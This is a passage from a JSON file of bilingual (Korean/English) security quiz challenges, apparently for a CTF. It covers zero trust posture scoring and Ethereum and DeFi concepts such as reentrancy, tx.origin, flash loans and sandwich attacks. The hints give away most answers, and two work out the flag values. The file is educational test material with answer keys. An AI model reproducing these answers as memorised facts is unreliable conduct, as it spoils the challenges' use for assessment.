      "ko": "표준 참조 제로 트러스트 아키텍처는 접근 결정의 핵심 계산 로직에 이름을 붙였다. 주체의 과거 행동, 요청하는 자산의 상태, 위협 인텔리전스, 환경 요소를 입력받아 점수화하고, 정해진 임계값과 비교해 허용 여부를 낸다. \"신뢰 ___\"(trust ___)로 불리는 이 결정 로직을, 두 단어로 답하라.",
      "en": "The standard reference zero trust architecture gives a name to the core computation behind an access decision. It takes the subject's history, the requested asset's state, threat intelligence and environmental factors, scores them, and compares against a set threshold to produce allow or deny. It is called the \"trust ___\". Answer with the two-word term."
    },
    "hints": {
      "ko": [
        "점수를 내는 \"계산 절차\".",
        "\"trust\" + \"algorithm\"."
      ],
      "en": [
        "The step-by-step \"computation\" that produces the score.",
        "\"trust\" + \"algorithm\"."
      ]
    }
  },
  {
    "id": "t4_ztcapstone",
    "tier": 4,
    "cat": "ztna",
    "track": "zerotrust",
    "points": 250,
    "ci": false,
    "hash": "f8012ce9989ed3507b6a04e30fbe74b4db8f4b1785441c5df69db95d91133c79",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "기기 포스처 종합 점수",
      "en": "Device Posture Composite Score"
    },
    "prompt": {
      "ko": "제로 트러스트 접근 결정에 쓰이는 기기 포스처 점수를 아래 배점으로 계산한다:\n\n- 하드웨어: TPM 2.0 +10, 측정 부팅(measured boot) +8, 디스크 암호화 +7\n- OS: 30일 이내 패치 +15, 방화벽 켜짐 +8, 최신 백신 +7\n- 에이전트: 엔드포인트 탐지 에이전트 실행 +15, MDM 등록 +10\n- 행동: 최근 이상 탐지 1건당 −10, 비업무시간 접근이면 −5\n\n아래 기기 프로필의 총점을 구해 `FLAG{POSTURE_<총점>}` 을 제출하라.\n\n```\ntpm_2_0:          yes\nmeasured_boot:    no\ndisk_encryption:  yes\npatched_30d:      yes\nfirewall:         yes\ncurrent_av:       yes\nendpoint_agent:   yes\nmdm_enrolled:     no\nrecent_anomalies: 2\noff_hours:        no\n```",
      "en": "Compute the device posture score used in a zero trust access decision, with this weighting:\n\n- Hardware: TPM 2.0 +10, measured boot +8, disk encryption +7\n- OS: patched within 30 days +15, firewall on +8, current AV +7\n- Agent: endpoint detection agent running +15, MDM enrolled +10\n- Behavior: -10 per recent anomaly, -5 if the access is off-hours\n\nWork out the total for the device profile below and submit `FLAG{POSTURE_<total>}`.\n\n```\ntpm_2_0:          yes\nmeasured_boot:    no\ndisk_encryption:  yes\npatched_30d:      yes\nfirewall:         yes\ncurrent_av:       yes\nendpoint_agent:   yes\nmdm_enrolled:     no\nrecent_anomalies: 2\noff_hours:        no\n```"
    },
    "hints": {
      "ko": [
        "하드웨어 10+0+7=17, OS 15+8+7=30, 에이전트 15+0=15, 행동 −20+0=−20.",
        "17+30+15−20 = 42."
      ],
      "en": [
        "Hardware 10+0+7=17, OS 15+8+7=30, agent 15+0=15, behavior -20+0=-20.",
        "17+30+15-20 = 42."
      ]
    }
  },
  {
    "id": "t0_web3gas",
    "tier": 0,
    "cat": "evm",
    "track": "web3",
    "points": 50,
    "ci": true,
    "hash": "2fe840e13244a9d748883574c1f1b7b1d7020eb39d0735b8f91ef5cf6f35173e",
    "fmt": "한 단어 / one word (3글자 / 3 chars)",
    "title": {
      "ko": "모든 연산에 붙는 요금",
      "en": "The Fee on Every Operation"
    },
    "prompt": {
      "ko": "이더리움에서는 스토리지 쓰기, 산술, 외부 호출 등 모든 연산이 정해진 양의 수수료 단위를 소모한다. 복잡한 컨트랙트 호출일수록 이 단위를 더 많이 쓰고, 이 단위당 가격을 높게 부르면 검증자가 그 트랜잭션을 먼저 처리한다. 자동차가 태우는 것에 빗댄 이 수수료 단위의 영어 이름은?",
      "en": "On Ethereum, every operation — a storage write, arithmetic, an external call — consumes a fixed amount of a fee unit. A more complex contract call spends more of it, and bidding a higher price per unit makes validators process your transaction sooner. What is the English name for this fee unit, named after what a car burns?"
    },
    "hints": {
      "ko": [
        "세 글자, 자동차 연료.",
        "가격 단위는 Gwei."
      ],
      "en": [
        "Three letters, car fuel.",
        "Its price is quoted in Gwei."
      ]
    }
  },
  {
    "id": "t0_web3evm",
    "tier": 0,
    "cat": "evm",
    "track": "web3",
    "points": 50,
    "ci": true,
    "hash": "603871c2ddd41c26ee77495e2e31e6de7f9957e0dea3b0f09abf8a5ee17a0d4a",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "모든 노드가 똑같이 돌리는 기계",
      "en": "The Machine Every Node Runs Alike"
    },
    "prompt": {
      "ko": "이더리움에서 컨트랙트 바이트코드를 실행하는 가상 머신이 있다. 스택(최대 1024항목)·메모리·스토리지·콜데이터로 구성되고, 모든 노드에서 동일한 결과를 보장한다 — 그래야 합의가 성립한다. 이 실행 환경의 세 글자 약어는?",
      "en": "A virtual machine executes contract bytecode on Ethereum. It has a stack (up to 1024 items), memory, storage and calldata, and it guarantees the same result on every node — which is what makes consensus possible. Give the three-letter acronym for this execution environment."
    },
    "hints": {
      "ko": [
        "\"Ethereum Virtual Machine\".",
        "오피코드 CALL·SLOAD·SSTORE 를 실행한다."
      ],
      "en": [
        "\"Ethereum Virtual Machine\".",
        "It runs opcodes like CALL, SLOAD, SSTORE."
      ]
    }
  },
  {
    "id": "t1_web3solidity",
    "tier": 1,
    "cat": "contract",
    "track": "web3",
    "points": 65,
    "ci": true,
    "hash": "659dae769fc38e2b1061c8111dfb7cbda70050430d86d87fd3ae497aefc767ae",
    "fmt": "한 단어 / one word (8글자 / 8 chars)",
    "title": {
      "ko": "컨트랙트를 쓰는 언어",
      "en": "The Language Contracts Are Written In"
    },
    "prompt": {
      "ko": "이더리움 스마트 컨트랙트를 작성하는 주력 언어. C++·JavaScript 를 닮은 정적 타입 언어이고, 0.8 버전부터 산술 오버플로가 기본으로 revert 된다. 파일 확장자는 .sol 이다. 이 언어의 이름은?",
      "en": "The dominant language for writing Ethereum smart contracts. Statically typed, resembling C++ and JavaScript, and since version 0.8 arithmetic overflow reverts by default. The file extension is .sol. Name this language."
    },
    "hints": {
      "ko": [
        "여덟 글자, \"견고함\"이라는 뜻.",
        "Remix IDE 에서 바로 컴파일해 볼 수 있다."
      ],
      "en": [
        "Eight letters, means \"firmness\".",
        "You can compile it right in the Remix IDE."
      ]
    }
  },
  {
    "id": "t1_web3wei",
    "tier": 1,
    "cat": "evm",
    "track": "web3",
    "points": 65,
    "ci": true,
    "hash": "1ed2b38c11c70aa02adedf9fe807482472daef00689af3eeb6141346ec3f3c70",
    "fmt": "한 단어 / one word (3글자 / 3 chars)",
    "title": {
      "ko": "이더의 가장 작은 조각",
      "en": "The Smallest Slice of Ether"
    },
    "prompt": {
      "ko": "이더리움 금액은 내부적으로 정수로만 다뤄진다. 1 ETH = 10^18 의 이 단위이며, 컨트랙트의 `value`·`balance` 는 전부 이 단위다. 한 암호학자의 이름을 딴 이 최소 단위의 세 글자 이름은?",
      "en": "Ether amounts are handled internally as integers only. 1 ETH = 10^18 of this unit, and a contract's `value` and `balance` are all in it. Give the three-letter name of this smallest unit, named after a cryptographer."
    },
    "hints": {
      "ko": [
        "세 글자.",
        "1 Gwei = 10^9 of this."
      ],
      "en": [
        "Three letters.",
        "1 Gwei = 10^9 of this."
      ]
    }
  },
  {
    "id": "t1_web3keccak",
    "tier": 1,
    "cat": "evm",
    "track": "web3",
    "points": 65,
    "ci": true,
    "hash": "07b72b422e9f1f16afad4fb7f7121cddff7c1f57a1e5a8c6e9c14301043f5138",
    "fmt": "값 그대로 / literal (9글자 / 9 chars)",
    "title": {
      "ko": "이더리움의 만능 해시",
      "en": "Ethereum's Everywhere Hash"
    },
    "prompt": {
      "ko": "이더리움은 주소 도출, 함수 셀렉터, 스토리지 슬롯 계산, 이벤트 토픽에 모두 같은 256비트 해시 함수를 쓴다. SHA-3 표준화 과정에서 나온 원본 알고리즘으로, 패딩이 최종 SHA3-256 과 다르다. 비트 수까지 포함한 이 함수의 Solidity 내장 이름은?",
      "en": "Ethereum uses one 256-bit hash function for address derivation, function selectors, storage slot computation and event topics. It is the original algorithm from the SHA-3 standardization process, with padding that differs from final SHA3-256. Give its Solidity built-in name including the bit-size suffix."
    },
    "hints": {
      "ko": [
        "\"keccak\" + 비트 수.",
        "Solidity: `keccak256(abi.encodePacked(...))`."
      ],
      "en": [
        "\"keccak\" + the bit count.",
        "Solidity: `keccak256(abi.encodePacked(...))`."
      ]
    }
  },
  {
    "id": "t1_web3erc20",
    "tier": 1,
    "cat": "onchain",
    "track": "web3",
    "points": 65,
    "ci": true,
    "hash": "47eeb2eac350e1923b8cbdfa4396a077b36e62a01946c2904ea7932d52b7c5f2",
    "fmt": "약어 / acronym (5글자 / 5 chars, 하이픈 없이 / no hyphen)",
    "title": {
      "ko": "대체 가능 토큰의 규격",
      "en": "The Fungible Token Spec"
    },
    "prompt": {
      "ko": "이더리움에서 대체 가능한(fungible) 토큰이 지켜야 하는 인터페이스 표준. `totalSupply()`·`balanceOf(address)`·`transfer(address,uint256)`·`approve`·`allowance` 여섯 함수와 `Transfer`·`Approval` 두 이벤트를 정의한다. 지갑·거래소가 아무 토큰이나 다룰 수 있는 건 이 표준 덕분이다. 이 표준의 이름(하이픈 없이)은?",
      "en": "The interface standard a fungible token must follow on Ethereum. It defines six functions — `totalSupply()`, `balanceOf(address)`, `transfer(address,uint256)`, `approve`, `allowance` — and two events, `Transfer` and `Approval`. Wallets and exchanges can handle any token because of it. Name this standard (no hyphen)."
    },
    "hints": {
      "ko": [
        "\"ERC\" + 번호. 하이픈 없이 다섯 글자.",
        "NFT 는 ERC721."
      ],
      "en": [
        "\"ERC\" + a number. Five characters, no hyphen.",
        "NFTs use ERC721."
      ]
    }
  },
  {
    "id": "t1_web3reentrancy",
    "tier": 1,
    "cat": "contract",
    "track": "web3",
    "points": 65,
    "ci": true,
    "hash": "f8e63de0a2892e35ccc0c153775aa405050923bd27d282ce23f7617de4783972",
    "fmt": "한 단어 / one word (10글자 / 10 chars)",
    "title": {
      "ko": "The DAO를 무너뜨린 것",
      "en": "What Brought Down The DAO"
    },
    "prompt": {
      "ko": "취약한 `withdraw()` 는 잔액을 0으로 만들기 전에 `msg.sender.call{value: ...}` 로 외부에 ETH 를 먼저 보낸다. 받는 컨트랙트의 `receive()` 가 그 순간 다시 `withdraw()` 를 호출하면, 아직 갱신 안 된 잔액으로 또 인출된다 — 볼트가 빌 때까지. 2016년 The DAO($60M)를 뚫은 이 취약점의 이름은?",
      "en": "A vulnerable `withdraw()` sends ETH out via `msg.sender.call{value: ...}` before zeroing the balance. If the receiving contract's `receive()` calls `withdraw()` again right then, it withdraws once more against a balance that is not yet updated — until the vault is empty. Name this vulnerability that broke The DAO in 2016 ($60M)."
    },
    "hints": {
      "ko": [
        "\"re\" + \"entrancy\" — 다시 들어감.",
        "방어는 검사-효과-상호작용 순서, 또는 nonReentrant 가드."
      ],
      "en": [
        "\"re\" + \"entrancy\" - entering again.",
        "Defended by the checks-effects-interactions ordering, or a nonReentrant guard."
      ]
    }
  },
  {
    "id": "t1_web3eoa",
    "tier": 1,
    "cat": "evm",
    "track": "web3",
    "points": 65,
    "ci": true,
    "hash": "7d36d8de1b144b09050482ad18a5598d233380cdffd5c8818864c206bac8b8b0",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "사람이 쥔 계정",
      "en": "The Account a Human Holds"
    },
    "prompt": {
      "ko": "이더리움에는 두 종류의 계정이 있다. 하나는 코드가 없고 개인 키로만 통제되며 트랜잭션을 스스로 시작할 수 있다. 다른 하나는 배포된 코드를 가지며 호출되어야만 실행된다. 앞의 것 — 개인 키가 통제하는 계정 — 을 부르는 세 글자 약어는?",
      "en": "Ethereum has two kinds of account. One has no code, is controlled only by a private key, and can start a transaction itself. The other holds deployed code and only runs when called. Give the three-letter acronym for the first — the account a private key controls."
    },
    "hints": {
      "ko": [
        "\"Externally Owned Account\".",
        "반대는 컨트랙트 계정(contract account)."
      ],
      "en": [
        "\"Externally Owned Account\".",
        "The opposite is a contract account."
      ]
    }
  },
  {
    "id": "t2_web3cei",
    "tier": 2,
    "cat": "contract",
    "track": "web3",
    "points": 90,
    "ci": true,
    "hash": "7003a83a33ee667a6feca59ad1e5404c544a238a557cc21c475b030934dc4acb",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "콜백 공격을 막는 순서",
      "en": "The Ordering That Blocks the Callback Attack"
    },
    "prompt": {
      "ko": "컨트랙트가 외부 호출을 한 뒤에야 자기 상태를 갱신하면, 그 외부가 되돌아 들어와(callback) 갱신 안 된 상태로 함수를 다시 실행할 수 있다. 표준 방어는 함수 본문을 세 단계로 고정하는 것이다: 먼저 조건을 검사하고, 다음 내부 상태를 모두 갱신하고, 마지막에만 외부와 상호작용한다. 이 세 단계 순서의 약어는?",
      "en": "If a contract updates its state only after making an external call, that external party can call back in and run the function again against un-updated state. The standard defense fixes the function body into three phases: check the conditions first, then update all internal state, and only then interact with anything external. Give the acronym for this three-phase ordering."
    },
    "hints": {
      "ko": [
        "Checks — Effects — Interactions.",
        "C, E, I."
      ],
      "en": [
        "Checks - Effects - Interactions.",
        "C, E, I."
      ]
    }
  },
  {
    "id": "t2_web3txorigin",
    "tier": 2,
    "cat": "contract",
    "track": "web3",
    "points": 90,
    "ci": true,
    "hash": "c5f58daa1e98cade54453e1588e6e240ef2049aa149f2c2fc99433b835e553c6",
    "fmt": "값 그대로 / literal (9글자 / 9 chars)",
    "title": {
      "ko": "누가 원래 시작했나",
      "en": "Who Originally Started It"
    },
    "prompt": {
      "ko": "Solidity 에서 `msg.sender` 는 직접 호출자이고, 다른 전역 변수는 트랜잭션을 처음 서명한 계정을 가리킨다. 인증에 후자를 쓰면(SWC-115), 피해자가 공격자의 컨트랙트를 호출하도록 유도하는 순간 그 컨트랙트가 피해자 명의로 지갑 함수를 호출할 수 있다. 인증에 쓰면 안 되는 이 전역 변수의 이름은? (점 포함)",
      "en": "In Solidity `msg.sender` is the direct caller, while another global refers to the account that first signed the transaction. Using the latter for authentication (SWC-115) lets an attacker's contract call a wallet function as the victim, the moment the victim is tricked into calling that contract. Name this global you must not use for auth (include the dot)."
    },
    "hints": {
      "ko": [
        "`tx.` + `origin`.",
        "고쳐 쓸 것: `msg.sender`."
      ],
      "en": [
        "`tx.` + `origin`.",
        "Use `msg.sender` instead."
      ]
    }
  },
  {
    "id": "t2_web3delegatecall",
    "tier": 2,
    "cat": "evm",
    "track": "web3",
    "points": 90,
    "ci": true,
    "hash": "42a841eaaf146552ff6f21a3f586a727059106bc3b60ac3cc9ef86ea46f20ef0",
    "fmt": "한 단어 / one word (12글자 / 12 chars)",
    "title": {
      "ko": "남의 코드, 내 스토리지",
      "en": "Their Code, My Storage"
    },
    "prompt": {
      "ko": "이 저수준 호출은 대상 컨트랙트의 코드를 실행하되 `msg.sender`·`msg.value`·그리고 결정적으로 **스토리지**는 호출한 쪽의 것을 그대로 쓴다. 업그레이더블 프록시 패턴의 핵심이지만, 두 컨트랙트의 스토리지 슬롯이 어긋나면 상태가 덮어써진다 — 2017년 Parity 멀티시그($30M)의 원인. 이 opcode(0xF4)의 Solidity 이름은?",
      "en": "This low-level call runs the target contract's code but keeps the caller's `msg.sender`, `msg.value`, and crucially its **storage**. It is the heart of the upgradeable-proxy pattern, but if the two contracts' storage slots do not line up, state gets overwritten — the cause of the 2017 Parity multisig loss ($30M). Give the Solidity name of this opcode (0xF4)."
    },
    "hints": {
      "ko": [
        "\"delegate\" + \"call\".",
        "일반 `call` 과 달리 컨텍스트를 넘기지 않고 유지한다."
      ],
      "en": [
        "\"delegate\" + \"call\".",
        "Unlike a plain `call`, it preserves the context instead of switching it."
      ]
    }
  },
  {
    "id": "t2_web3selector",
    "tier": 2,
    "cat": "evm",
    "track": "web3",
    "points": 90,
    "ci": true,
    "hash": "d53915b9ab562425ce909c86d583c04f553d805e8ba939c2b9f7c73647c9555f",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "호출을 라우팅하는 4바이트",
      "en": "The Four Bytes That Route a Call"
    },
    "prompt": {
      "ko": "컨트랙트에 트랜잭션을 보낼 때, calldata 의 첫 4바이트가 어떤 함수를 실행할지 정한다. 이 4바이트는 함수 시그니처 문자열(예: `transfer(address,uint256)`)의 Keccak-256 해시 앞 4바이트다. `transfer(address,uint256)` 의 경우 `0xa9059cbb`. calldata 맨 앞의 이 4바이트를 부르는 두 단어(명사 + 명사)는?",
      "en": "When you send a transaction to a contract, the first 4 bytes of the calldata decide which function runs. Those 4 bytes are the leading 4 bytes of the Keccak-256 hash of the function signature string (e.g. `transfer(address,uint256)`) — `0xa9059cbb` for that one. What two words (noun + noun) name these first 4 bytes of calldata?"
    },
    "hints": {
      "ko": [
        "\"function\" + \"selector\".",
        "4byte.directory 로 역조회할 수 있다."
      ],
      "en": [
        "\"function\" + \"selector\".",
        "Reverse-lookup it at 4byte.directory."
      ]
    }
  },
  {
    "id": "t2_web3selfdestruct",
    "tier": 2,
    "cat": "contract",
    "track": "web3",
    "points": 90,
    "ci": true,
    "hash": "45c423dfef7889446c0718652044edbf79e8026de38c948d16a38b6dcfe80a66",
    "fmt": "한 단어 / one word (12글자 / 12 chars)",
    "title": {
      "ko": "컨트랙트를 지우는 opcode",
      "en": "The Opcode That Erases a Contract"
    },
    "prompt": {
      "ko": "이 opcode(0xFF)는 호출된 컨트랙트를 삭제하고, 남은 ETH 를 지정한 주소로 강제 전송한다 — 받는 쪽에 `receive()` 가 없어도 들어간다. 접근 제어 없이 노출되면(SWC-106) 누구나 컨트랙트를 파괴할 수 있다. 이 opcode 의 Solidity 이름은?",
      "en": "This opcode (0xFF) deletes the contract that calls it and force-sends its remaining ETH to a designated address — it lands even if the recipient has no `receive()`. Exposed without access control (SWC-106), anyone can destroy the contract. Give the Solidity name of this opcode."
    },
    "hints": {
      "ko": [
        "\"self\" + \"destruct\", 한 단어.",
        "강제 ETH 주입에도 쓰인다 (balance == 0 검사 우회)."
      ],
      "en": [
        "\"self\" + \"destruct\", one word.",
        "Also used to force ETH into a contract (bypassing a balance == 0 check)."
      ]
    }
  },
  {
    "id": "t2_web3flashloan",
    "tier": 2,
    "cat": "defi",
    "track": "web3",
    "points": 90,
    "ci": true,
    "hash": "45d41ff539eb1589f7df8ebcefaf27d29f5657879d881bc0827171e8fcc0aab1",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "한 트랜잭션 안에서 빌리고 갚기",
      "en": "Borrow and Repay in One Transaction"
    },
    "prompt": {
      "ko": "담보 없이 거액을 빌리되, 같은 트랜잭션이 끝나기 전에 수수료와 함께 상환하지 못하면 트랜잭션 전체가 revert 되어 아무 일도 없던 게 된다. 그 자체로는 합법적인 도구지만, bZx·Beanstalk·Euler 공격에서 가격 조작에 쓸 자본을 순간적으로 마련하는 엔진이었다. 이 대출을 부르는 두 단어는?",
      "en": "Borrow a large sum with no collateral, but if you do not repay it with a fee before the same transaction ends, the whole transaction reverts as if nothing happened. Legitimate on its own, but in the bZx, Beanstalk and Euler attacks it was the engine that momentarily supplied the capital for price manipulation. What two words name this loan?"
    },
    "hints": {
      "ko": [
        "\"flash\" — 순식간.",
        "Aave·dYdX 가 제공한다. 원자성(atomicity)에 기댄다."
      ],
      "en": [
        "\"flash\" - in an instant.",
        "Offered by Aave and dYdX. It relies on atomicity."
      ]
    }
  },
  {
    "id": "t2_web3swap",
    "tier": 2,
    "cat": "defi",
    "track": "web3",
    "points": 150,
    "ci": false,
    "hash": "dfe4e74b66042bd21c61071ebd89eed2dc03ce49a947c549caac39f841c2932f",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "상수곱 스왑 출력",
      "en": "Constant-Product Swap Output"
    },
    "prompt": {
      "ko": "상수곱 AMM 은 두 준비금의 곱 k = x·y 를 스왑 전후로 유지한다. 입력 토큰에는 수수료가 먼저 붙는다: 실효 입력 = 입력 × (1 − 수수료). 그 뒤 새 준비금으로 k 를 맞추고, 상대 토큰의 감소분이 출력이다. 아래 스왑의 USDC 출력을 정수로 내림하여 `FLAG{SWAP_OUT_<정수>}` 를 제출하라.\n\n```\npool: 100 ETH, 300000 USDC\nswap in: 5 ETH -> USDC\nfee: 0.3%\n```",
      "en": "A constant-product AMM keeps the product k = x*y of its two reserves fixed across a swap. The input token is taxed first: effective input = input * (1 - fee). Then k is restored with the new reserves, and the drop in the other reserve is the output. Floor the USDC output of the swap below to a whole number and submit `FLAG{SWAP_OUT_<integer>}`.\n\n```\npool: 100 ETH, 300000 USDC\nswap in: 5 ETH -> USDC\nfee: 0.3%\n```"
    },
    "hints": {
      "ko": [
        "실효 입력 = 5 × 0.997 = 4.985. new_x = 104.985.",
        "new_y = (100·300000) / 104.985. 출력 = 300000 − new_y ≈ 14244.89 → 내림 14244."
      ],
      "en": [
        "Effective input = 5 * 0.997 = 4.985. new_x = 104.985.",
        "new_y = (100*300000) / 104.985. Output = 300000 - new_y ~ 14244.89 -> floor 14244."
      ]
    }
  },
  {
    "id": "t2_web3calldata",
    "tier": 2,
    "cat": "evm",
    "track": "web3",
    "points": 150,
    "ci": false,
    "hash": "2fc21fdb4def2a67427c1526367af56b9bd455c0e63d3285fffcd5a7c54f0a07",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "calldata 디코딩",
      "en": "Decoding Calldata"
    },
    "prompt": {
      "ko": "아래는 토큰 `transfer(address,uint256)` 호출의 raw calldata 다. 앞 4바이트는 어떤 함수를 부를지 정하는 메서드 id, 그 다음 32바이트는 왼쪽 0-패딩된 수신 주소, 마지막 32바이트는 uint256 금액이다. 금액을 10진수로 읽어 `FLAG{AMOUNT_<10진수>}` 를 제출하라.\n\n```\n0xa9059cbb0000000000000000000000001234567890abcdef1234567890abcdef123456780000000000000000000000000000000000000000000000000000000000002710\n```",
      "en": "Below is the raw calldata of a token `transfer(address,uint256)` call. The first 4 bytes are the method id that picks which function to run, the next 32 bytes are the left-zero-padded recipient address, and the last 32 bytes are the uint256 amount. Read the amount as a base-ten integer and submit `FLAG{AMOUNT_<integer>}`.\n\n```\n0xa9059cbb0000000000000000000000001234567890abcdef1234567890abcdef123456780000000000000000000000000000000000000000000000000000000000002710\n```"
    },
    "hints": {
      "ko": [
        "`0x` 와 8자, 64자를 떼면 마지막 64자가 금액.",
        "마지막 워드는 `...2710` = 0x2710."
      ],
      "en": [
        "Strip `0x`, the first 8 chars and the next 64; the last 64 hex chars are the amount.",
        "The last word is `...2710` = 0x2710."
      ]
    }
  },
  {
    "id": "t3_web3oracle",
    "tier": 3,
    "cat": "defi",
    "track": "web3",
    "points": 130,
    "ci": true,
    "hash": "64b97f56679f11a59298c57559f9b595830486dfd548d256ba82c0d9bd289ac8",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "DeFi의 눈",
      "en": "The Eyes of DeFi"
    },
    "prompt": {
      "ko": "스마트 컨트랙트는 체인 밖 데이터를 스스로 알 수 없다. 대출·청산·파생상품이 자산 가격을 알려면 외부에서 값을 받아와야 한다. DeFi 에서 이 가격 공급 장치를 부르는 두 단어(명사 + 명사)는? 이걸 한 교환소 풀의 즉시 시세로 순진하게 구현하면, 원자적 대출로 같은 블록 안에서 그 풀을 흔들어 값을 조작할 수 있다.",
      "en": "A smart contract cannot know off-chain data by itself. For lending, liquidation or derivatives to know an asset's price, a value must be supplied from outside. What two words (noun + noun) does DeFi use for this price supply mechanism? Implemented naively as one exchange pool's spot quote, an atomic borrow can shake that pool within the same block and manipulate the value."
    },
    "hints": {
      "ko": [
        "가격(price) + 공급 흐름(feed).",
        "안전한 설계: 시간가중 평균, 또는 여러 제공자 합의."
      ],
      "en": [
        "price + a feed of values.",
        "Safe designs: a time-weighted average, or many providers in agreement."
      ]
    }
  },
  {
    "id": "t3_web3twap",
    "tier": 3,
    "cat": "defi",
    "track": "web3",
    "points": 130,
    "ci": true,
    "hash": "435634ef069ca5d3959116d33109d2d6bdf61914fb3c5590d84648a73216d12f",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "시간으로 뭉갠 가격",
      "en": "Price Smeared Over Time"
    },
    "prompt": {
      "ko": "단일 블록의 즉시 시세는 순간적인 대량 거래 한 방에 크게 움직인다. 그래서 안전한 온체인 가격은 일정 시간 창(예: 30분) 동안의 가격을 시간으로 가중 평균해 쓴다. 짧은 조작을 비싸고 무의미하게 만드는 이 가격의 네 글자 약어는?",
      "en": "A single block's spot quote moves a lot on one momentary large trade. So a safe on-chain price uses the price averaged, weighted by time, over a window (say 30 minutes). Give the four-letter acronym for this price, which makes a brief manipulation expensive and pointless."
    },
    "hints": {
      "ko": [
        "\"Time-Weighted Average Price\".",
        "Uniswap v2 가 누적값(cumulative)으로 노출한다."
      ],
      "en": [
        "\"Time-Weighted Average Price\".",
        "Uniswap v2 exposes it as a cumulative value."
      ]
    }
  },
  {
    "id": "t3_web3mev",
    "tier": 3,
    "cat": "defi",
    "track": "web3",
    "points": 130,
    "ci": true,
    "hash": "ec8eb7a9ebcc48e69a54cf80fdb00b490b9b740f0e52fe7e2fbb4f1a8509edb5",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "블록의 보이지 않는 세금",
      "en": "The Invisible Tax on a Block"
    },
    "prompt": {
      "ko": "블록에 트랜잭션을 넣는 순서를 정하는 것은 블록 제안자다. 순서를 바꾸고, 트랜잭션을 끼워 넣고, 검열함으로써 뽑아낼 수 있는 최대 이익 — 프론트러닝·백러닝·청산 선점이 모두 여기 들어간다. 세 글자 약어는?",
      "en": "The block proposer decides the order transactions go into a block. The maximum profit extractable by reordering, inserting and censoring transactions — front-running, back-running and beating others to a liquidation all fall under it. Give the three-letter acronym."
    },
    "hints": {
      "ko": [
        "\"Maximal Extractable Value\" (예전엔 Miner Extractable).",
        "M, E, V."
      ],
      "en": [
        "\"Maximal Extractable Value\" (formerly Miner Extractable).",
        "M, E, V."
      ]
    }
  },
  {
    "id": "t3_web3sandwich",
    "tier": 3,
    "cat": "defi",
    "track": "web3",
    "points": 130,
    "ci": true,
    "hash": "8f5c570f55dd7921c9861e941be98a9492991d1a862d05283f6ddad56c891cca",
    "fmt": "한 단어 / one word (8글자 / 8 chars)",
    "title": {
      "ko": "피해자를 사이에 끼우다",
      "en": "Putting the Victim in the Middle"
    },
    "prompt": {
      "ko": "봇이 아직 처리되지 않은 큰 매수 스왑을 발견하면, 그 앞에 자기 매수를 넣어 가격을 올리고(피해자는 비싸게 산다), 피해자 거래 바로 뒤에 자기 매도를 넣어 차익을 챙긴다. 피해자 트랜잭션을 두 개로 감싸는 이 순서 조작 공격을 부르는, 음식에 빗댄 여덟 글자 영어 단어는?",
      "en": "A bot spots a large pending buy swap, places its own buy in front to push the price up (the victim buys high), and places its own sell right behind the victim's trade to take the difference. What eight-letter English word, named after a food, names this ordering attack that wraps the victim's transaction in two?"
    },
    "hints": {
      "ko": [
        "빵 두 조각 사이에 속을 넣은 음식.",
        "방어: 슬리피지 허용치 최소화, 비공개 제출 경로 사용."
      ],
      "en": [
        "A food with a filling between two slices of bread.",
        "Defenses: minimal slippage tolerance, a private submission path."
      ]
    }
  },
  {
    "id": "t3_web3mempool",
    "tier": 3,
    "cat": "onchain",
    "track": "web3",
    "points": 130,
    "ci": true,
    "hash": "b3ef9b748e9bb2991abb2e45715e8d566b56d7efa5675cf0f1da1c781ad143ed",
    "fmt": "한 단어 / one word (7글자 / 7 chars)",
    "title": {
      "ko": "대기실은 공개다",
      "en": "The Waiting Room Is Public"
    },
    "prompt": {
      "ko": "서명되었지만 아직 블록에 포함되지 않은 트랜잭션들이 각 노드의 이 대기 영역에 머문다. 누구나 그 내용을 볼 수 있고, 이익을 노리는 봇들은 이곳을 24시간 감시한다. 이 공개된 대기 영역을 부르는 일곱 글자 영어 단어는?",
      "en": "Transactions that are signed but not yet in a block sit in this waiting area on each node. Anyone can see their contents, and profit-hunting bots watch it around the clock. Give the seven-letter English word for this public waiting area."
    },
    "hints": {
      "ko": [
        "\"memory\" + \"pool\".",
        "이걸 우회하는 비공개 제출 경로가 따로 있다."
      ],
      "en": [
        "\"memory\" + \"pool\".",
        "Private submission paths exist to bypass it."
      ]
    }
  },
  {
    "id": "t3_web3cp",
    "tier": 3,
    "cat": "defi",
    "track": "web3",
    "points": 130,
    "ci": true,
    "hash": "5e5be14804c66fd10629463c83a4d42a927ba1582e28edd18099a7480c1c03e7",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "x 곱하기 y는 그대로",
      "en": "x Times y Stays the Same"
    },
    "prompt": {
      "ko": "Uniswap v2 류 AMM 은 두 토큰 준비금 x, y 에 대해 x·y = k 를 스왑 전후로 유지한다. 한쪽을 많이 사면 그쪽 준비금이 줄고 값이 오른다 — 곡선이 자동으로 가격을 매긴다. 이 불변식을 부르는 \"___ 곱\"(\"___ product\") 두 단어는?",
      "en": "A Uniswap-v2-style AMM keeps x*y = k for its two token reserves x, y across a swap. Buy a lot of one side and its reserve shrinks and its price rises — the curve prices it automatically. What two words name this invariant, the \"___ product\" formula?"
    },
    "hints": {
      "ko": [
        "k 가 \"일정하다(constant)\".",
        "\"constant\" + \"product\"."
      ],
      "en": [
        "k is held \"constant\".",
        "\"constant\" + \"product\"."
      ]
    }
  },
  {
    "id": "t3_web3chainlink",
    "tier": 3,
    "cat": "defi",
    "track": "web3",
    "points": 130,
    "ci": true,
    "hash": "b4bfe090fdd6cdf453b0c961c5cde06a23a5e401e90028225860d0c8b5578c4c",
    "fmt": "한 단어 / one word (9글자 / 9 chars)",
    "title": {
      "ko": "여러 제공자의 합의 가격",
      "en": "A Price Many Providers Agree On"
    },
    "prompt": {
